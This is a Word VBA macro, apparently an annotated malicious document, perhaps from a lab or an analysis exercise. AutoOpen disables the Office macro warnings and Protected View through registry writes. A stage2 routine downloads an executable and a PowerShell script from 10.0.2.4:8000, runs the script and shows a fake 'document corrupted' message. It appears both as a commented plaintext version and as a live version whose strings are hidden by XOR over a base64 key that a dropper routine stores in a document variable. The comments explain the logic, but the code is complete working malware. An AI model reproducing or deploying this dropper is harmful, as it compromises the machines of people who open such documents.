'Declare private variable "bool1" as a Boolean
Private bool1       As Boolean

'Declare private variable "Barray64" as an array of Bytes indexing at 0 with size 64
Private Barray64(0 To 63) As Byte

'Declare private variable "Barray128" as an array of Bytes indexing at 0 with size 128
Private Barray128(0 To 127) As Byte

'Subroutine with special name "AutoOpen" runs every time the document is opened
Sub AutoOpen()
    'Open a windows shell object in the variable wso
    Set wso = CreateObject("WScript.Shell")
    'Write/Update Registry entries for versions 11-16 of Word and Excel to presumably disable script execution protections
    wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\VBAWarnings", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\VBAWarnings", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\11.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\12.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\14.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\15.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Word\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView\DisableInternetFilesInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView\DisableAttachementsInPV", 1, "REG_DWORD"
    wso.RegWrite "HKCU\Software\Microsoft\Office\16.0\Excel\Security\ProtectedView\DisableUnsafeLocationsInPV", 1, "REG_DWORD"
    'wso.RegDelete "HKLM:\SOFTWARE\Microsoft\AMSI\Providers\{2781761E-28E0-4109-99FE-B9D127C57AFE}", 1, "REG_DWORD"
    
    'call "stage2"
    stage2
End Sub

'stage2 with evaluated strings
'Sub stage2()
'    Dim FileUrl1 As String
'    Dim fileDownload As Object
'    Dim exeStream As Object
'
'    'Set URL of files to be downloaded
'    FileUrl1 = "http://10.0.2.4:8000/ms457.exe"
'    FileUrl2 = "http://10.0.2.4:8000/12152021_17_59_52.ps1"
'
'    'GET exe file using "Microsoft.XMLHTTP"
'    Set fileDownload = CreateObject("Microsoft.XMLHTTP")
'    fileDownload.Open "GET", FileUrl1, False
'    fileDownload.send
'
'    If fileDownload.Status = 200 Then
'       'If exe GET sucessful save to "C:\\Windows\\Temp\\ms457.exe"
'        Set exeStream = CreateObject("ADODB.Stream")
'        exeStream.Open
'        exeStream.Type = 1
'        exeStream.Write fileDownload.responseBody
'        exeStream.SaveToFile "C:\\Windows\\Temp\\ms457.exe", 2
'        exeStream.Close
'
'        'GET ps1 file using "Microsoft.XMLHTTP"
'        Set fileDownload = CreateObject(Microsoft.XMLHTTP)
'        fileDownload.Open "GET", FileUrl2, False
'        fileDownload.send
'
'        If fileDownload.Status = 200 Then
'            'If ps1 GET sucessful save to "C:\\Windows\\Temp\\12152021_17_59_52.ps1"
'            Set ps1Stream = CreateObject("ADODB.Stream")
'            ps1Stream.Open
'            ps1Stream.Type = 1
'            ps1Stream.Write fileDownload.responseBody
'            ps1Stream.SaveToFile "C:\\Windows\\Temp\\12152021_17_59_52.ps1",2
'            ps1Stream.Close
'
'            'Run the powershell script and display message box with "Error : This document is corrupted"
'            strCommand = "Powershell -File ""C:\\Windows\\Temp\\12152021_17_59_52.ps1"
'            Set shellObj = CreateObject("WScript.Shell")
'            Set shellOutp = shellObj.exec(strCommand)
'            MsgBox "Error : This document is corrupted"
'
'        Else
'            'If ps1 GET fail display message box with "Error : This document may not contain all data"
'            MsgBox "Error : This document may not contain all data"
'        End If
'    End If
'End Sub

Sub stage2()
    Dim FileUrl1 As String
    Dim fileDownload As Object
    Dim exeStream As Object
    
    FileUrl1 = arrToStr(Array(27, 130, 145, 220, 107, 105, 227, 173, 36, 35, 90, 115), 0) & arrToStr(Array(102, 61, 1, 98, 215, 65, 35, 41, 12, 237, 243, 73, 79, 220, 245, 131, 47, 107), 12)
    FileUrl2 = arrToStr(Array(231, 5, 241, 126, 128), 30) & arrToStr(Array(229, 156, 244, 118, 138, 3, 156, 78, 212, 221, 227, 87, 157, 68, 183, 103, 245, 151, 164, 5, 253, 5, 243, 8, 88, 232, 168, 49, 169, 136, 63, 70, 252, 6, 175, 130, 86), 35)
    
    Set fileDownload = CreateObject(arrToStr(Array(63), 72) & arrToStr(Array(122, 244, 181, 158, 247, 192, 144, 189, 239, 205, 245, 132, 158, 103, 8, 157), 73))
    fileDownload.Open arrToStr(Array(74, 128, 173), 89), FileUrl1, False
    fileDownload.send
    
    If fileDownload.Status = 200 Then
        Set exeStream = CreateObject(arrToStr(Array(204, 174), 92) & arrToStr(Array(80, 230, 185, 231, 27, 2, 1, 166, 162, 145), 94))
        exeStream.Open
        exeStream.Type = 1
        exeStream.Write fileDownload.responseBody
        exeStream.SaveToFile arrToStr(Array(254, 205, 102, 31, 235, 93, 164, 177, 116, 147, 0, 143, 232, 96), 104) & arrToStr(Array(165, 240, 148, 143, 238, 107, 33, 249, 87, 202, 145, 197, 106, 58), 118), 2
        exeStream.Close
        
        Set fileDownload = CreateObject(arrToStr(Array(179, 240, 86, 249, 147, 195, 49, 202, 142, 102, 103, 201, 59, 206), 132) & arrToStr(Array(59, 173, 216), 146))
        fileDownload.Open arrToStr(Array(233, 58, 86), 149), FileUrl2, False
        fileDownload.send
        
        If fileDownload.Status = 200 Then
            Set ps1Stream = CreateObject(arrToStr(Array(8, 157, 17, 113, 152, 38), 152) & arrToStr(Array(49, 218, 245, 178, 84, 117), 158))
            ps1Stream.Open
            ps1Stream.Type = 1
            ps1Stream.Write fileDownload.responseBody
            ps1Stream.SaveToFile arrToStr(Array(121, 36, 188, 224, 247, 214), 164) & arrToStr(Array(136, 136, 204, 194, 118, 250, 245, 202, 27, 248, 176, 122, 118, 155, 230, 46, 137, 34, 144, 125, 31, 152, 228, 146, 34, 95, 199, 54, 202, 203, 105, 250, 46, 78), 170), 2
            ps1Stream.Close
            
            strCommand = arrToStr(Array(117, 44, 204, 11, 35, 222, 143, 40, 222, 167, 241, 108, 12, 66, 198, 222, 185, 220, 66, 157, 209, 56, 155, 152, 7), 204) & arrToStr(Array(126, 188, 254, 57, 247, 53, 250, 41, 160, 73, 23, 196, 34, 122, 170, 182, 204, 240, 116, 10, 129, 214, 181, 75, 72, 167, 206, 241, 177, 24, 55, 130, 183, 51), 229)
            Set shellObj = CreateObject(arrToStr(Array(144, 139, 51, 186, 32, 81, 100, 111, 217, 11, 17, 250), 263) & arrToStr(Array(149), 275))
            Set commandOutp = shellObj.exec(strCommand)
            MsgBox arrToStr(Array(149, 98, 218, 73, 249, 32, 48, 205, 229, 119, 69, 236, 185), 276) & arrToStr(Array(16, 4, 3, 101, 182, 232, 25, 100, 134, 36, 137, 159, 194, 190, 46, 62, 60, 143, 33, 126, 183), 289)
            
        Else
            MsgBox arrToStr(Array(253, 131, 239, 226, 230, 125, 86, 121, 207, 39, 234, 233, 38, 228, 156, 50, 146, 203, 72, 88, 21, 204, 56, 59, 78, 102, 89, 7), 310) & arrToStr(Array(248, 7, 125, 249, 201, 5, 171, 158, 118, 239, 47, 141, 80, 91, 208, 48, 238, 18), 338)
        End If
    End If
End Sub

'Called in "arrToStr" with document variable "kBQHAjmEelVSHUyT"
Public Function createThrQutrArr(ByVal docVar As String) As Byte()

    'Run function "assignOnce" if "bool1" is false
    If Not bool1 Then assignOnce
    
    'Get ascii value of "docVar"
    Dim asciiDocVarRet() As Byte: asciiDocVarRet = unicodeToAscii(docVar)
    'Get length of ascii docVar
    Dim asciiDocVarLen As Long: asciiDocVarLen = UBound(asciiDocVarRet) + 1
    
    'If asciiDocVar length isn't mulitple of 4 raise error
    If asciiDocVarLen Mod 4 <> 0 Then Err.Raise vbObjectError, , ""
    
    'While decrementor is > 0 read from the back of the string until a non "=" character is found
    'This sets the max len to before the = in the string
    Do While asciiDocVarLen > 0
        If asciiDocVarRet(asciiDocVarLen - 1) <> Asc("=") Then Exit Do
        asciiDocVarLen = asciiDocVarLen - 1
    Loop
    
    'Get three quaters of the length of the ascii docVar
    Dim thrQutrLen As Long: thrQutrLen = (asciiDocVarLen * 3) \ 4
    
    'Declare byte array with three quater docVar length
    Dim thrQutrLenArr() As Byte
    ReDim thrQutrLenArr(0 To thrQutrLen - 1) As Byte
    
    Dim long1 As Long
    Dim long2 As Long
    
    Do While long1 < asciiDocVarLen
        'Read next 4 bytes of ascii docVar make value "A" if reach the end of the string
        Dim byte1 As Byte: byte1 = asciiDocVarRet(long1): long1 = long1 + 1
        Dim byte2 As Byte: byte2 = asciiDocVarRet(long1): long1 = long1 + 1
        Dim byte3orA As Byte: If long1 < asciiDocVarLen Then byte3orA = asciiDocVarRet(long1): long1 = long1 + 1 Else byte3orA = Asc("A")
        Dim byte4orA As Byte: If long1 < asciiDocVarLen Then byte4orA = asciiDocVarRet(long1): long1 = long1 + 1 Else byte4orA = Asc("A")
        
        '4 chars must be ascii values
        If byte1 > 127 Or byte2 > 127 Or byte3orA > 127 Or byte4orA > 127 Then _
            Err.Raise vbObjectError, , ""
        
        'Get the index of the 4 ascii values in Barray64 by checking its value in Barray128
        Dim byte1B64Indx As Byte: byte1B64Indx = Barray128(byte1)
        '"byte2B64Indx" Orig called same as "docVarCpy"
        Dim byte2B64Indx As Byte: byte2B64Indx = Barray128(byte2)
        '"byte3B64Indx" Orig called same as "asciiDocVar"
        Dim byte3B64Indx As Byte: byte3B64Indx = Barray128(byte3orA)
        Dim byte4B64Indx As Byte: byte4B64Indx = Barray128(byte4orA)
        
        'Raise an error if the indexes are over 63
        If byte1B64Indx > 63 Or byte2B64Indx > 63 Or byte3B64Indx > 63 Or byte4B64Indx > 63 Then _
        Err.Raise vbObjectError, , ""
        
        'Byte1 index *4 ored with byte 2 index DIV 16
        Dim byte12Or As Byte: byte12Or = (byte1B64Indx * 4) Or (byte2B64Indx \ &H10)
        'Byte2 index Anded with 15 * 16 ored with byte3 index DIV 4
        Dim byte23Or As Byte: byte23Or = ((byte2B64Indx And &HF) * &H10) Or (byte3B64Indx \ 4)
        'Byte3 index Anded with 3 * 64 ored with byte4 index
        Dim byte34Or As Byte: byte34Or = ((byte3B64Indx And 3) * &H40) Or byte4B64Indx
        
        'Adding the 3 computed bytes to array
        thrQutrLenArr(long2) = byte12Or: long2 = long2 + 1
        If long2 < thrQutrLen Then thrQutrLenArr(long2) = byte23Or: long2 = long2 + 1
        If long2 < thrQutrLen Then thrQutrLenArr(long2) = byte34Or: long2 = long2 + 1
    Loop
    'Return threeQuaterArray
    createThrQutrArr = thrQutrLenArr
End Function

'Runs once then sets "bool1" to True so it isn't ran again
Private Sub assignOnce()
    
    Dim intCharVar As Integer, interator As Integer
    interator = 0
    
    'Create a byte array containing ascii value of "A"-"Z", "a"-"z", "0"-"9","+","/"
    For intCharVar = Asc("A") To Asc("Z"):
        Barray64(interator) = intCharVar:
        interator = interator + 1:
    Next
    For intCharVar = Asc("a") To Asc("z"):
        Barray64(interator) = intCharVar:
        interator = interator + 1:
    Next
    For intCharVar = Asc("0") To Asc("9"):
        Barray64(interator) = intCharVar:
        interator = interator + (1 + 0):
    Next
    Barray64(interator) = Asc("+"): interator = interator + 1
    Barray64(interator) = Asc("/"): interator = interator + 1
    
    'Barray64 = [ A-Z, a-z, 0-9, +, /]
    
    'Populate Barray128 with all 255
    For interator = 0 To 127: Barray128(interator) = 255: Next
    
    'Barray128 = Barray64 index at ascii value index in Barray128 e.g. Barray128[68('D')]=3 and Barray128[47('/')]=63
    For interator = 0 To 63: Barray128(Barray64(interator)) = interator: Next
    
    '"bool1" set to True so not ran again
    bool1 = True
End Sub

'Called in "createThrQutrArr"
Private Function unicodeToAscii(ByVal docVar As String) As Byte()

    Dim docVarCpy() As Byte: docVarCpy = docVar
    'If Upper Bound of docVarCpy +1 divided by 2 = 0 excluding fractions then return docVarCpy
    'This presumably +1 to round up when dividing odd number upper bounds
    Dim lenIntDiv2 As Long: lenIntDiv2 = (UBound(docVarCpy) + 1) \ 2
    If lenIntDiv2 = 0 Then unicodeToAscii = docVarCpy: Exit Function
    
    'Create Byte array with length 0 To halfDocVarLen
    Dim asciiDocVar() As Byte
    ReDim asciiDocVar(0 To lenIntDiv2 - 1) As Byte
    
    'For half array length times
    Dim docVarInc As Long
    For docVarInc = 0 To lenIntDiv2 - 1
        'Add value of char at 2*docVarInc with 256* value of char at 2*docVarInc +1
        Dim intCharVar As Long: intCharVar = docVarCpy(2 * docVarInc) + 256 * CLng(docVarCpy(2 * docVarInc + 1))
        'If value >=256 then set value = "?"
        'Only null value fits this check so any non ascii characters will be encoded with a ?
        If intCharVar >= 256 Then intCharVar = Asc("?")
        'Write to arr
        asciiDocVar(docVarInc) = intCharVar
    Next
    unicodeToAscii = asciiDocVar
End Function

Private Function arrToStr(arrInput As Variant, thrQutrOffset As Integer)

    Dim strRet As String
    Dim BarrPriv() As Byte
    'Get computed byte array from Document variable "kBQHAjmEelVSHUyT" and "createThrQutrArr" function
    BarrPriv = createThrQutrArr(ActiveDocument.Variables("kBQHAjmEelVSHUyT"))
    
    strRet = ""
    'for "interator" in range len(arrInput)
    For interator = LBound(arrInput) To UBound(arrInput)
        'to string return value add the Char at the current "interator" + offset XORed with the value at "arrInput(interator)"
        strRet = strRet & Chr(BarrPriv(interator + thrQutrOffset) Xor arrInput(interator))
    Next
    arrToStr = strRet
End Function

'Not directly called how ran??
Sub dropper()
    'Sets variable "kBQHAjmEelVSHUyT" to unicode string value
    ActiveDocument.Variables.Add Name:="kBQHAjmEelVSHUyT", _
     Value:="c/blrFFGzJwUDWpdVBM1WO9xExkjgIB9euvb5lcOj3GFDrrKs8VGpDOyfPrp2W+tdIdIxKWVMM81wTkH2Z9unLFgc84o3/FnchOXx/GEr/bJwZW4yNYzXM0NxfmN6h+i+8lIdnPDw/y99zpDvDTK1Rvkc9O0NMCd5NOyBlLNYv2/oBJf/pk1i/ywXqz6SD+Ed4Zv+YiufwJJ2V412ghirofXNRg6HuC8oL/m7KO1Baapnn6VwCYqqtQfvBCgTy7H1aV9av5p//lHil1/JUO7blGt502yy9FBSiuqu5n+YN7rZMfPbhDYkU6EaaZ9xSRnmH5LmIf5wkQ4sImEfBeS966EKhnyxALH2FDISSEQQYpjdJb50BCoJosACu2xHyyfmXRrYBDbjXcQpk36v6HRXExJ/1Ub07jxnY2UXWxZm0+DmgaA81Hnpi02YexVWjdGN2iMJx6Wp3HK9xjPTuE8e7RRmnM="
End Sub


